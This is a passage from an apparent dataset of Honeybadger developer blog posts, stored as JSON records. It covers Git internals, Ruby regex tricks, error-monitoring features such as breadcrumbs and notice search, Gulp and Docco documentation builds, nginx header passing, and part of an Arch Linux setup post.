so it can be retrieved based on content rather than location. Most traditional local and networked storage devices are location addressed. Git has two data structures: a mutable index (i.e., a connection point between the object database and the working tree) and an immutable, append-only object database. There are five types of objects: blob: this is the content of a file. tree: this is the equivalent of a directory commit: this links tree objects together to form a history tag: this is a container that contains a ref to another object, as well as other metadata packfile: zlib version compressed of various other objects Each object has a unique name, which is a SHA-1 hash of its contents. To better understand how all of this fits together, let's create a dummy project directory and run git init . Trying it out Open your terminal, and create a new directory. Then, run git init . You should then see something similar to the following output: ➜  Documents mkdir understanding-git\n➜  understanding-git git init\nInitialized empty Git repository in /Users/juliekent/Documents/understanding-git/.git/\n➜  understanding-git git:(master) I am sure you have done this many times but may not have really cared to know what was actually in the newly created .git directory. Let's check it out. If you run ls -a via your terminal, you will see the .git directory. By default, it is a hidden directory, which is why you need the -a flag. Place cd .git into the directory, and then run ls . You should see something like this: ➜  .git git:(master) ls\nHEAD        config      description hooks       info        objects     refs We will be focusing on HEAD , objects , and refs directories. We will also run some commands so that we have index files, but this will come later. The description file is only used by the GitWeb program. The config file is pretty straight forward, as it contains project configuration options. The the info directory keeps a global exclude file for ignored patterns you don't want to track, which is based on the .gitignore file; I'm sure most of you are familiar with it. The objects directory Let's start with the objects directory. To see what is created, run find .git/objects . You should see the following: ➜  understanding-git git:(master) find .git/objects\n.git/objects\n.git/objects/pack\n.git/objects/info Next, let's create a file: echo 'this is me' > myfile.txt This creates a file named myfile.txt containing this is me . Now, let's run the command git hash-object -w myfile.txt . Your output should be a random mix of numbers and letters -- this is a SHA-1 checksum hash. If you're not familiar with SHA-1, you can read more here . Next, copy your SHA-1, and run the following command: git cat-file -p (insert your SHA here) You should see \"this is me\", the contents of your file that was created. Cool! This is how content-addressable Git objects work; you can think of it as a key-value store where the key is the SHA-1, and the value is the contents. Let's write some new content to our original file: echo 'this is not me' > myfile.txt Then, run the hash-object command again: git hash-object -w myfile.txt You now have two unique SHA-1s for both versions of this file. If you want further proof, run find .git/objects -type f , and you should see both via your terminal window. If you'd like to learn more about how other objects in Git work, I recommend following this tutorial . The refs directory Let's move onto refs. When running find .git/refs , you should see the following output: ➜  understanding-git git:(master) ✗ find .git/refs\n.git/refs\n.git/refs/heads\n.git/refs/tags As we saw in the previous section about objects, we know that Git creates unique SHA-1 hashes for each one. Of course, we could run all of our Git commands utilizing each object's hash. For example, git show 123abcd , but this is unreasonable and would require us to remember the hash of every object. Refs to the rescue! A reference is simply a file stored in .git/refs containing the hash of a commit object. Let's go ahead and commit our myfile.txt , so we can better understand how refs work. Go ahead and run git add myfile.txt and git commit -m 'first commit' . You should see something like this: ➜  understanding-git git:(master) ✗ git add myfile.txt\n➜  understanding-git git:(master) ✗ git commit -m 'first commit'\n[master (root-commit) 40235ba] first commit\n 1 file changed, 1 insertion(+)\n create mode 100644 myfile.txt Now, let's navigate to the .git/refs/heads directory by running cd .git/refs/heads . From there, run cat master . You should see the SHA-1. Finally, run git log -1 master which should output something similar to the following: commit Unique SHA-1 (HEAD -> master)\nAuthor: Julie <jkent2910@gmail.com>\nDate:   Mon Aug 3 15:59:59 2020 -0500\n\n   first commit Cool! As you can see, branches are simply just references. When we change the location of the master branch, all Git has to do is change the contents of the refs/heads/master file. Likewise, creating a new branch creates a new reference file with the commit hash. Helpful hint: If you ever want to see all references, run git show-ref , which will list all references. Sooooo, what is HEAD?! HEAD is a symbolic reference. You might wonder, when running git branch <branch> , how Git knows the SHA-1 of the last commit. Well, the HEAD file is usually a symbolic reference to your current branch. You might be thinking to yourself, \"You keep saying symbolic ; what does that mean?\" Great question! Symbolic means that it contains a pointer to another reference. If your head is spinning, I'm with you. It took me quite a bit of Googling and reading to finally understand what exactly HEAD is. Here is a great analogy, pulled from this website A good analogy would be a record player and the playback and record keys on it as the HEAD. As the audio starts recording, the tape moves ahead, moving past the head by recording onto it. The stop button stops the recording while still pointing to the point it last recorded, and the point that record head stopped is where it will continue to record again when Record is pressed again. If we move around, the head pointer moves to different places; however, when Record is pressed again, it starts recording from the point the head was pointing to when Record was pressed. Go ahead and run: cat .git/HEAD , and you should see something like this: ➜  understanding-git git:(master) cat .git/HEAD\nref: refs/heads/master This makes sense because we are on the master branch. HEAD is, essentially, always going to be the reference to the last commit in the currently checked-out branch. Helpful Tip: You can run git diff HEAD to view the difference between HEAD and the working directory. Wrapping up We have covered a lot in this post! We've learned a bit of fun history regarding how Git came about and examined the main plumbing that makes all of the magic happen! If you want to continue to dive deeper into Git, as well as better understand how some of the common commands work, I highly recommend the book titled \"Pro Git\", which is available for free here .", "date": "2021-03-22"},
{"website": "Honey-Badger", "title": "2015 Honeybadger Year in Review", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/2015-honeybadger-year-in-review/", "abstract": "I'm always amazed when I think about how much our tiny team of engineers is able to accomplish in a year. So I thought it'd be fun to make a \"highlight reel\" of the things we're proudest of this year. Here goes nothing! New platforms We started the year only officially supporting two languages, Ruby and JavaScript. Now we have six, with more on the way: Ruby JavaScript Elixir - Also check out our Elixir blog post Go NodeJS Java - Also, check out our Java announcement . The response from customers has been wonderful! As projects become more and more polyglot, it's super handy to be able to take your toolchain with you. New search and alert filters In 2015 we rebuilt our search system from the ground up using solr. You can now search for errors using almost any piece of data included in the error. Check out the Search Documentation for more info. In addition, you can use her powerful search system to route errors as they come in. For example, you could assign all errors that come in on staging to whoever is responsible for your staging server. Product Improvements There are too many to list here, so I'll limit myself to three. :) Performance: You may have noticed that Honeybadger is a lot faster than it used to be. This is due to us moving to Cassandra for storage of exceptions. This is an ongoing projects, so expect more to come! Causes / Nested exceptions: We now fully support nested exceptions as seen in Ruby 2.1, as well as other languages like Java. Read more Documentation: We've rewritten most of our documentation, and rebuilt our documentation site from the ground up to make answers easier to find. Conferences and Articles One of the great things about working at Honeybadger is that we get to hang out with our friends—AHEM—customers at conferences, TAX FREE! This year we did four big conference presentations: RailsConf: SVG charts and graphics in Ruby (video) Madison+Ruby: Ditching our single page application (video) RubyNation (no video available, sorry) Mountain West Ruby (no video available, sorry) And we wrote a lot of popular blog posts. Here are a couple of my faves: The Rubyist's Guide to Environment Variables : If you want to be able to effectively manage web apps in development and in production, you have to understand environment variables. This post will show you how environment variables really work - and perhaps more importantly, how they DON'T work. We'll also explore some of the most common ways to manage environment variables in your Rails apps. How Ruby Interprets and Runs Your Programs : In this post we'll follow the journey of a simple program as it's lexed, parsed and compiled into bytecode. We'll use the tools that Ruby gives us to spy on the interpreter every step of the way. Use any C library from Ruby : Fiddle is a little-known module that was added to Ruby's standard library in 1.9.x. It allow you to interact directly with C libraries from Ruby. In this post we'll start with some simple examples and finish by using termios to talk to an arduino over a serial port. How unicorn talks to nginx - an introduction to unix sockets in Ruby : In this post we start out with the basics of unix sockets and finish by creating our own simple Ruby application server which can be proxied by nginx. That's all? Hardly! I'm sure I'm going to make someone sad by leaving out one of their favorite achievements of 2015. But I have to draw the line somewhere — I'm surprised you're still reading! Here's to a great 2016! Where's my bottle of champaigne?", "date": "2015-12-30"},
{"website": "Honey-Badger", "title": "Introducing Notice Search", "author": ["Kevin Webster"], "link": "https://www.honeybadger.io/blog/introducing-notice-search/", "abstract": "Our new Notice Search gives you more tools to find information about individual Notices. We think this will come in handy when you need to track down specific details about your errors. Here is a screenshot: Overall notice counts and key dates have been shuffled around to give more emphasis. Full featured searching based on data points contained within your Notices. Enlarged interactive timeline showing the time distribution of your error notices. Common aggregated values based on search results A paginated list of Notices you can scan and select to view details. The search functionality should feel familiar, as it works exactly like our Project search only constrained to data found within your Notices. For the launch of the new search we are aggregating some common data points for you: Affected Users, Browsers, and Hostnames. It’s about your Users Let’s face it, no matter how hard you try, bugs are going to happen. How you respond to a customer-affecting bug or outage can make the difference between losing customers and building confidence. We built Honeybadger so you can be alerted as soon as possible, but we also provide tools so you can be informed about which users have been impacted, which we call Affected Users. I want to share two essential tips for how to make the most of the new search and our Affected Users feature. Tip #1: Adding the right context Our Honeybadger client can track contextual data during the lifecycle of your app (we call it Context). Just give Honeybadger some data you care about, and if an error happens, we will present that data in the resulting error page. There is one piece of context data that gets special treatment, and that is user info (either email or id). Our Affected Users features are reliant on this supplied context data. If you haven’t done it yet, we think adding the user to context should be your next commit in production. Here is one way you can add the currently logged in user if you are using Rails and Devise: class ApplicationController < ActionController :: Base before_action :set_user_context def set_user_context Honeybadger . context ( user_email: current_user . email ) if current_user end end All of our clients support adding context, so consult our documentation for your specific runtime. Tip #2: Tracking Deploys One more feature you should take advantage of is Deploy Tracking. It’s really simple to set up . As long as your system for deploying has any form of post hooks, you could write some Ruby code, build a simple curl, or even integrate with some CI tools we have made just for you ( Github , CircleCI ). Putting it all together With these two things in place, you can now visualize and track all your Affected Users since the last deploy. Let’s see how this works with the new search (BTW, it behaves the same as in our Project search). In the search hint modal, an option for “Since Deploy” should appear, and upon selecting it, the deploy time will be injected into your query: The “Affected Users” aggregate drop down lists the top 3 affected users (sorted by the amount of times they were affected). You can select the bottom link to open a modal containing a listing of all affected users within the query results: We also added a link in the Affected Users modal (see screenshot above) that takes you directly to our API with a JSON payload containing all Affected Users. The search query is persisted so you can save this and use it outside of Honeybadger if you want. We like to be proactive if any of our users have been adversely affected by a bug. Often that means sending an email explaining the situation. These tools will allow you to do the same for your users. Enjoy We hope this updated search functionality will help you both debug quicker and serve your users better! Give us a shout and let us know of any requests or issues you run into while using the new search.", "date": "2020-03-04"},
{"website": "Honey-Badger", "title": "Cool Ruby Regex Tricks", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/ruby-regex-tricks/", "abstract": "I thought it'd be fun to follow yesterday's article about regex conditionals by looking at some other neat tricks you can do with regular expressions in ruby. Splitting strings via regular expression You're probably quite familiar with splitting strings using a text delimiter: \"one,two\" . split ( \",\" ) # => [\"one\", \"two\"] But did you know that split will also accept a regular expression? # use `,` and `-` as delimiters \"one,two-three\" . split ( /,|-/ ) => [ \"one\" , \"two\" , \"three\" ] # Use comma as thousands separator for US currency, # but use a space for Euros \"1,000USD\" . split /(?=.*(USD))(?(1),| )/ Capturing delimiters Here's a neat party trick. Normally, when you split a string, the delimiters go away: # The commas vanish! \"one,two\" . split ( \",\" ) # => [\"one\", \"two\"] But if you use a regular expression and you put the delimiter inside of a group, split will capture the delimiter as well. \"one,two-three\" . split ( /(,|-)/ ) => [ \"one\" , \",\" , \"two\" , \"-\" , \"three\" ] The reason this happens is that split actually splits the string at the boundary of each capture group. Abusing split You can abuse split to make it behave almost like match . In the code below, I'm using four groups in the regular expression to split the string into 4 pieces. \"1-800-555-1212\" . split ( /(1)-(\\d{3})-(\\d{3})-(\\d{4})/ ) => [ \"\" , \"1\" , \"800\" , \"555\" , \"1212\" ] The first item in the resulting array is an empty string because the regular expression matches the entire source string. Global matching By default, regular expressions will only match a pattern once. In the code below, we only get one match even though there are five possible matches. \"12345\" . match /\\d/ => #<MatchData \"1\"> In other languages like Perl, the solution would be to flag the regular expression as \"global\". Ruby doesn't have that option, but it does have the String#scan method. The scan method returns an array containing all matches: \"12345\" . scan /\\d/ => [ \"1\" , \"2\" , \"3\" , \"4\" , \"5\" ] It even has a handy block syntax: \"12345\" . scan /\\d/ do | i | puts i end Unfortunately, there doesn't seem to be any way to scan a string lazily. So this technique probably isn't suitable for - say - processing a 500mb file. Scanning with groups Now at this point I hope you're wondering what kind of weird tricks we can do by using groups in our scan. Unfortunately, the behavior here is completely predictable and BORING. Groups result in a multi-dimensional array: \"hiho hiho\" . scan /(hi)(ho)/ => [[ \"hi\" , \"ho\" ], [ \"hi\" , \"ho\" ]] There is one weird edge case. If you use groups, anything NOT in a group will not be returned. \"hiho hiho\" . scan /(hi)ho/ => [[ \"hi\" ], [ \"hi\" ]] Shorthand I bet you know about =~ as a way to check whether or not a regular expression matches a string. It returns the index of the character where the match begins. \"hiho\" =~ /hi/ # 0 \"hiho\" =~ /ho/ # 2 There's another quick way to check for a match though. I'm talking about the === operator. /hi/ === \"hiho\" # true When we write a === b in ruby, we're asking \"does b belong in the set defined by a\". Or in this case, \"does 'hiho' belong to the set of strings matched by the regex /hi/ \". The === operator is used internally in Ruby's case statements. That means that you can use regular expressions in case statements as well. case \"hiho\" when /hi/ puts \"match\" end The triple-equals operator can also be useful for letting your own methods accept either regular expressions or strings. Imagine that you want to execute some code when an error happens, unless it's on a pre-configured list of classes to ignore. In the example below, we use the === operator to allow the user to specify either a string, or a regular expression. def ignored? ( error ) @ignored_patterns . any? { | x | x === error . class . name } end That's it! To be sure, there are dozens of little tricks like this scattered throughout Ruby and Rails. If have one you particularly like, let me know!", "date": "2015-10-27"},
{"website": "Honey-Badger", "title": "F*ck-That Money", "author": ["Josh Wood"], "link": "https://www.honeybadger.io/blog/f-ck-that-money/", "abstract": "I've met some hugely successful people. Some of them are happy. Some of them... aren't. I've noticed some things about the ones who aren't: They're obsessed with their careers They spend a lot of time at work They aren't fulfilled by the work they do They aren't content with what they have In many circles, these people are way more successful than most of us. They probably have better networks. They might have fancier job titles. They certainly make more money. The Silicon Valley meme goes, \"start a company and sell it for so much money that you can say 'f*ck you' to anyone in the world.\" Or maybe an alternate career path is to climb the corporate ladder at Google until you've banked that privilege. So much toxic bullshit stems from that line of thinking. I'd rather have f*ck-that money—e.g., a moderate amount of money that empowers you to live a meaningful life. F*ck-that money isn't about being a pretentious asshole; it's about keeping your priorities straight. For example: Miss your kid's soccer practice to catch up on emails? F*ck that! Power through lunch? F*ck that! Skip the gym? F*ck that! Work over the weekend? F*ck that! Save that side project for when you have more free time? F*ck that! You get the idea... At Honeybadger, this mindset has led us to turn down acquisition offers and investors—to stay small and grow naturally. We're not in this business to be rich; we're in it to be free. Regret the best years of our lives? Fuck that. Btw, we're currently hiring a developer to join us.", "date": "2020-02-10"},
{"website": "Honey-Badger", "title": "Introducing Breadcrumbs", "author": ["Kevin Webster"], "link": "https://www.honeybadger.io/blog/introducing-breadcrumbs/", "abstract": "Have you ever dealt with an error in production, and no matter what you try , you can't replicate the issue on your development or staging environments? Often the next step is to gather more data by tossing a debug log at production. If you don't have a good way to correlate logs with a request it can be frustrating, especially during an incident. We added a feature to help, and it's called Breadcrumbs. A Breadcrumb is very much like a log event, but it's stored and reported along side an error. Like a log, a Breadcrumb contains a message, but it can also hold metadata (in the form of a hashmap). A set of breadcrumbs are collected throughout the life of a request (or job invocation), and are immediately dropped unless an error is reported. Adding your own breadcrumbs to the stack is simple. Just make a call to Honeybadger.add_breadcrumb anywhere in your code: Honeybadger . add_breadcrumb ( \"Loading User\" , metadata: { user_name: user_name , }) And if an error is reported after it, you should see it in the Breadcrumb stack: Oh user_name looks empty, that might cause problems. Automatic breadcrumbs The Honeybadger Ruby library contains hooks into Ruby & Rails to automatically collect breadcrumbs. For example, all log messages emitted in Production  (sent through the Logger class) are captured and created as breadcrumbs. We also tie into Rails Instrumentation to gather breadcrumbs for Controller Actions, SQL Queries, Active Job invocations, etc... How can you use it? Breadcrumbs are currently available via our Ruby client. You must update to version 4.4.0 and be sure to enable it in the config as it will be disabled by default until we release a 5.0.0 version of the gem, to ensure we work out any kinks. Please try it out and let us know if you run into any issues. Extending Breadcrumbs Now that Breadcrumbs have been formally introduced, let's see a quick example of how to extend them. If you enable Breadcrumbs in a Rails app, you will get some standard instrumentation breadcrumbs attached for free, but what if we want more? Let's say we want to create a Breadcrumb every time our app sends out an HTTP request. This info might come in handy while debugging. A simple way to accomplish this would be to call Honeybadger.add_breadcrumb at each request invocation. def send_a_message res = conn . post ( \"/message\" , { user: user . id , body: \"Hey!\" }. to_json ) Honeybadger . add_breadcrumb ( \"Request: /message\" , metadata: { user: user . id }) res end Here we store a breadcrumb after every POST to /message . The next time our app throws an error after sending this message, we should see which user sent the message and when it happened in relation to the error, Yay! This is a bit cumbersome though, as we would need an add_breadcrumb call at each location we send out a request. I do want to note , however, there are advantages to creating breadcrumbs like this. You can be very specific about what metadata you want to capture with this method. Often this is a great way to gather targeted information motivated by a bug in production. Really I just want to know when and where a request goes out. It would also be nice if a library could do most of the work for me ;). Instrumenting with Faraday We are going to cheat a little and assume you are using the popular Faraday request library. We could build our own middleware to accomplish our task, but instead I want to use Rails instrumentation as a broker. Luckily, there is middleware provided by the faraday_middleware gem that will emit events for us. Ensure the gem is in your Gemfile and also make sure the instrumentation middleware is injected into the connection. connection = Faraday . new do | conn | conn . use :instrumentation conn . adapter Faraday . default_adapter end This can require a little work if you don't share your connection inside your app. If you are lazy you can also prepend the ConnectionOptions to ensure that all requests have the middleware enabled. Be careful though, as this will instrument any Faraday requests that happen within your app and included gems as well (which you might want)! Using Rails instrumentation has some nice side effects, one being that we can make multiple subscriptions for other use cases (say for general logging purposes). Binge watching our requests Now that our Faraday requests are instrumented, we can subscribe and get to creating some breadcrumbs: ActiveSupport :: Notifications . subscribe \"request.faraday\" do | _ , _ , _ , _ , data | method = data [ :method ]. to_s . upcase metadata = data . to_h . slice ( :url , :status ). merge ({ method: method }) Honeybadger . add_breadcrumb ( \" #{ method } : #{ metadata [ :url ] } \" , category: \"request\" , metadata: metadata ) end Honeybadger is now adding a breadcrumb for each outgoing request! Notice we are only inspecting a few data points from our requests. We don't add outgoing or response body payloads as there is a good chance that sensitive data could leak into our breadcrumb metadata. Let us know how it goes! We hope that Breadcrumbs will be a helpful addition your debugging toolbox. Try it out, and give us a shout if there is anything you would like to see added.", "date": "2019-07-25"},
{"website": "Honey-Badger", "title": "Building Documentation with Gulp, Docco and LiveReload", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/building-documentation-sites-with-gulp-docco-and-livereload/", "abstract": "I'm going to tell you something very personal, and I hope you won't make fun of me. I love comments. Big chunky block comments. Small, concise inline comments. I love them all. When you're really trying to understand a code-base nothing beats well-written, extensive annotation. Of course there are issues. Most of the time, people don't maintain comments, or they do it in a half-assed way. Some people are good developers but poor writers. Yes, there are issues, and often the sensible approach is to avoid comments altogether. But we're not going to be doing that today. The Project I've always been fascinated by emulators, and when Yusuke Endoh released Optcarrot, a NES emulator written in Ruby I knew I had to take a look. For the past three months, on nights and weekends, I've been poring over the source, figuring out just how an NES emulator works. I've also been writing pretty extensive annotations. Since I'd like to publish these annotations one day, I need a documentation generator to convert the source files into a website. Here are my criteria: It should output HTML displaying both annotations and the full highlighted source code. It should support markdown. It shouldn't force me into any rdoc-like format. To meet these requirements, I decided to use Docco . It bills itself as a \"quick and dirty documentation generator\" and was originally used to generate the documentation for underscore . The only problem with docco is that it's a little too bare-bones. When working with other static site generators I've gotten used to niceties like built-in servers and live-reload. Fortunately for us, it's quite easy to use Gulp to add these features. Installing the packages Make sure you have node and npm installed . If you don't, none of the following steps will work. Next, create your project directory and initialize a node project: mkdir doccoblog\ncd doccoblog\nnpm init -y Now we're ready to install the packages we'll need: npm install -g gulp\nnpm install --save gulp-docco gulp-livereload st As you can probably guess, most of the heavy lifting in our system will be done by gulp and the gulp-docco and gulp-livereload plugins. The directory structure We're going to put our source files in src and the resulting HTML files in dest . There's nothing magic about these directory names. We'll configure them later. But for now, we'll create the directories and add a simple source file to src . mkdir {src,dest} Here's the sample source file, in src/sample.rb : # ## Sample: this class doesn't do much. # # Here's a description about what this class may # or may not do. It turns out it just sets `@foo` to @ `\"bar\"` # class Sample def initialize @foo = 'bar' end end Configuring gulp If you're not familiar with Gulp, it's a tool used to build static assets like JS, HTML and CSS files. Much like Ruby's rake command, Gulp doesn't do anything on its own. Instead, you have to tell it what to do by writing tasks in gulpfile.js . Let's create a gulpfile.js and add our tasks: var gulp = require ( ' gulp ' ), docco = require ( \" gulp-docco \" ), livereload = require ( ' gulp-livereload ' ), st = require ( ' st ' ), http = require ( ' http ' ); var source = \" src/*.rb \" var destination = \" dest \" gulp . task ( ' build ' , function () { gulp . src ( source ) . pipe ( docco ()) . pipe ( gulp . dest ( destination )) . pipe ( livereload ()); }); gulp . task ( ' watch ' , [ ' serve ' ], function () { livereload . listen (); gulp . watch ( source , [ ' build ' ]); }); gulp . task ( ' serve ' , function ( done ) { http . createServer ( st ({ path : __dirname + ' / ' + destination , cache : false }) ). listen ( 8080 , done ); }); As you can see, we've defined three tasks: gulp build : Builds the documentation and places it in /dest gulp watch : Serves the documentation at https://localhost:8080 and rebuilds it when the source files change. Also supports live-reload via browser plugin. gulp serve : Serves the documentation, but doesn't build it or watch for changes. If I run gulp watch then open my browser to https://localhost:8080/sample.html I'll see that my documentation has been built: If my browser has the livereload extension installed, changes to the source files will cause the browser to automatically refresh, meaning that I can easily check to see if my annotations look good in their rendered form.", "date": "2017-03-21"},
{"website": "Honey-Badger", "title": "Honeybadger for Go (golang) 0.0.2 released", "author": ["Josh Wood"], "link": "https://www.honeybadger.io/blog/honeybadger-for-golang-0-0-2/", "abstract": "This week we released some improvements to our Go client, which reports panics and errors from Go applications. Check out the package on GitHub , and read on to learn about the update! Before notification callbacks One of the additions that we're most excited about is the honeybadger.BeforeNotify callback, which allows you to ignore or modify error notifications as they occur. For example, you could ignore all errors of a specific type: honeybadger . BeforeNotify ( func ( notice * honeybadger . Notice ) error { if notice . ErrorClass == \"SkippedError\" { return fmt . Errorf ( \"Skipping this notification\" ) } // Return nil to send notification for all other classes. return nil } ) ...or you could modify the error class for all errors: honeybadger.BeforeNotify(\n  func(notice *honeybadger.Notice) error {\n    // Errors in Honeybadger will always have the class name \"GenericError\".\n    notice.ErrorClass = \"GenericError\"\n    return nil\n  }\n) Customizing error grouping Honeybadger groups by the error type and the first line of the stack by default, but in some cases you may want to provide your own grouping strategy. In 0.0.2 we've made this possible by adding support for custom fingerprints. A fingerprint is simply a unique string; all errors that have the same fingerprint will be grouped together in Honeybadger. A special case for a custom fingerprint in Go is errors.errorString . Because that type is used for many different types of errors in Go, Honeybadger may appear to group unrelated errors together. To work around that, you could group errors.errorString by message instead of type by customizing the fingerprint in a honeybadger.BeforeNotify callback: honeybadger . BeforeNotify ( func ( notice * honeybadger . Notice ) error { if notice . ErrorClass == \"errors.errorString\" { notice . Fingerprint = notice . Message } return nil } ) Note that in this example, the stack is ignored. If you want to group by message and stack, you could append data from notice.Backtrace to the fingerprint string. Custom notification improvements If you've handled a panic in your code, but would still like to report the error to Honeybadger, you can use honeybadger.Notify to report the error: if err != nil { honeybadger . Notify ( err ) } In 0.0.2, we've added some extra types which you can use with this API. Overriding the error class name Honeybadger uses the class name (in Go this is the type) of the error object to group similar errors together. If your types are often generic (such as errors.errorString ), you can improve grouping by overriding the default with our honeybadger.ErrorClass type: honeybadger . Notify ( err , honeybadger . ErrorClass { \"CustomClassName\" }) Overriding the fingerprint We also added a new honeybadger.Fingerprint type which allows you to set the fingerprint locally: honeybadger . Notify ( err , honeybadger . Fingerprint { \"A unique string\" }) Note that any honeybadger.BeforeNotify callbacks may also modify the fingerprint before the notification is sent. Minor improvements and bugfixes We also fixed some bugs and made some other minor feature improvements in 0.0.2. Speaking of which, we also added a CHANGELOG . I hope that these improvements will help you exterminate errors and panics in your Go applications faster. If you haven't tried Honeybadger for Go yet, sign up for a free trial !", "date": "2016-03-29"},
{"website": "Honey-Badger", "title": "How HTTP headers get passed from nginx to your Ruby app", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/how-cookies-and-other-http-headers-get-passed-from-nginx-to-rack-and-into-rails/", "abstract": "These days almost all web development is done with frameworks. Whether you use rails, Sinatra, or Lotus, you don't really have to think about how cookies and other headers pass from nginx or apache, to the application server and into your app. They just do. We're going to examine this journey in a little more depth. Because it turns out that the story of headers contains a lot of interesting information about the history of the web. What are HTTP headers anyway? Whenever a web browser makes a requesnginxt, it sends along these things called HTTP headers. They contain cookies, information about the user agent, caching info — a whole lot of really useful stuff. You can see what headers are being sent by looking at a request in your browser's development tools. Here's an example. As you can see, the headers aren't anything magical. They're just text formatted in a certain way. How headers aren't passed to your app If you've ever written a rack app, you've probably seen the env hash, which contains the app's environment variables. If you take a look inside of it, you'll see that in addition to normal system environment variables, it also contains all the request headers. # config.ru run lambda { | env | [ 200 , { \"Content-Type\" => \"text/plain\" }, [ env . inspect ]] } # Outputs: # { \"HTTP_HOST\"=>\"localhost:9000\", \"HTTP_CONNECTION\"=>\"keep-alive\", \"HTTP_PRAGMA\"=>\"no-cache\", \"HTTP_CACHE_CONTROL\"=>\"no-cache\", \"HTTP_ACCEPT\"=>\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"HTTP_UPGRADE_INSECURE_REQUESTS\"=>\"1\", \"HTTP_USER_AGENT\"=>\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36\", ... } This is not how nginx passes headers to your app. :) Application servers Nowadays, most Ruby web apps run in application servers like Unicorn. Since the app servers aren't spawned by nginx, nginx can't set their environment variables. How do the headers travel from nginx to unicorn then? Simple. When nginx forwards the request to the app server, it sends the entire requests — headers and all. To demonstrate this, I built a simple application server that dumps everything nginx sends it to STDOUT. require \"socket\" # Create the socket and \"save it\" to the file system server = UNIXServer . new ( '/tmp/socktest.sock' ) # Wait until for a connection (by nginx) socket = server . accept # Read everything from the socket while line = socket . readline puts line . inspect end socket . close If you configure nginx to connect to this server instead of Unicorn, you'll see exactly what information is being sent to the app server: just a normal HTTP request. Headers and all. For more information on how to write a simple upstream app server, check out my post on unix sockets . Why bother with environment variables then? In 1993, the NSCA published a spec for something called the \"Common Gateway Interface\" or CGI for short. It was a way for servers like Apache to run arbitrary programs on disk to generate dynamic webpages. A user would request a page, and Apache would literally shell out and run a program to generate the results. Since Apache spawned the apps directly, it could set their environment variables. The CGI standard specifies that HTTP headers be passed in as environment variables. And to avoid any naming collision with the existing environment variables, it specifies that \"HTTP_\" should be prepended to the name. So you wind up with a bunch of environment variables that look like this: HTTP_ACCEPT=\"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\"\n HTTP_ACCEPT_CHARSET=\"ISO-8859-1,utf-8;q=0.7,*;q=0.7\"\n HTTP_ACCEPT_ENCODING=\"gzip, deflate\"\n HTTP_ACCEPT_LANGUAGE=\"en-us,en;q=0.5\"\n HTTP_CONNECTION=\"keep-alive\"\n HTTP_HOST=\"example.com\"\n HTTP_USER_AGENT=\"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0\" Nowadays hardly anyone uses CGI for new development, but it's still very common to see HTTP headers stored as environment variables — even though sometimes they're fake environment variables. How app servers fake it Application servers parse headers out of the raw HTTP request. So how do they get in the environment? Well, the app server puts them there. I dug around a little in webrick and was able to find the smoking gun : self . each { | key , val | next if /^content-type$/i =~ key next if /^content-length$/i =~ key name = \"HTTP_\" + key name . gsub! ( /-/o , \"_\" ) name . upcase! meta [ name ] = val } Eventually, these \"fake\" environment variables are merged in with other more real environment variables and passed into your rack app and on to Rails, which takes them back out of the environment hash. :)", "date": "2015-12-28"},
{"website": "Honey-Badger", "title": "My 2017 Arch Linux desktop setup", "author": ["Josh Wood"], "link": "https://www.honeybadger.io/blog/my-2017-arch-linux-desktop-setup/", "abstract": "Goals My desktop is currently running a fairly custom configuration of Arch Linux\nwhich I'm going to attempt to explain in this post. First, I use my desktop as a\nmulti-purpose system. My primary activities include: Open source software development (Ruby, Node, Go, Elixir, etc.) General desktop use (browser, email, chat, etc.) Gaming (including some Windows-only games, like Overwatch) Personal file server/cold storage (important files I would never want to lose) Media server (Plex, etc.) Kitchen sink (I run whatever appliances I happen to be using at the moment\nwith docker) I dual-boot Windows 10 so that I can play Overwatch and a few other games. I\npreviously also used Windows as a media/file server, but I prefer to use Linux\nfor my personal computing as there are many privacy concerns about Windows 10\nand it's kind of a black box to me. For example, I tried to use Storage Spaces\nand nearly lost some data when a drive failed and Windows wouldn't mount my\nmirrored space (even though it was supposed to tolerate that failure\ntransparently). I also wanted to encrypt the space, but after that near-miss I\ndidn't feel confident in allowing Windows to encrypt the same data it almost ate\nwithout the encryption. That said, I had some pretty lofty goals for my new desktop setup: 1. At-rest encryption for everything I encrypt the entire 500GB disk on my laptop with dm-crypt/LUKS (standard full-disk encryption technique on most Linux distros). I use LVM on top of LUKS so that all my\nvolumes are encrypted at-rest, including swap. I find it much better (for the\nsake of sanity) to encrypt everything rather than try to decide what deserves\nencryption and what doesn't. I wanted to use the same approach on my desktop, except my disk layout is more\ncomplex: I have multiple HDDs (for media/archive storage) with a 128GB SSD M.2\ncard. 2. One encryption password It would be simple enough to install the OS on my SSD using the same LUKS on LVM\napproach as my laptop, but that would mean my HDDs must be encrypted as separate\nvolumes. I might be able to store those extra keys on the encrypted SSD (either\nin a keychain or when mounting the volumes in /etc/fstab ), but ideally I\nwanted all my data encrypted using the same key which is entered once, at boot. The other issue with using the SSD exclusively for the OS is that there would\nbe no redundancy in case of drive failure (meaning it would take longer to\nrestore my OS volumes from a backup). 3. Full redundancy I wanted to be able to tolerate at least a single drive failure for my storage as\nwell as my OS and bootloader. That means I need to use a raid1 or raid5\nconfiguration for my OS as well as HDD storage, and at least 2 drives for each\nvolume group. 4. OS Speed I wanted to leverage my SSD as much as possible when booting the OS and\naccessing commonly used programs and files. Normally I'd just install the OS on\nthe SSD, but again that offered no redundancy, and files stored on the HDDs\nwould not benefit from it at all. 5. Flexible (and automated) system snapshots Arch is a rolling release, which means it gets the latest package updates\n(including the Linux kernel) immediately. I'm pretty sure Archers used \"YOLO\"\nbefore it was cool. It's important to have a way to roll back my system if it doesn't like an\nupdate. The alternatives are to drop everything I'm doing to troubleshoot and\nfix the issue or live with whatever it is until I can get around to it. With that in mind, I wanted to have regular system snapshots which I could\nrestore effortlessly. The setup My available drives consist of 1x128GB SSD (M.2), 2x5TB HDD, 4x2TB HDD. Because\nI don't have more than 5TB of data atm, I opted to keep the 2TB drives (which I\nsalvaged from a Seagate NAS) in reserve and go with the SSD 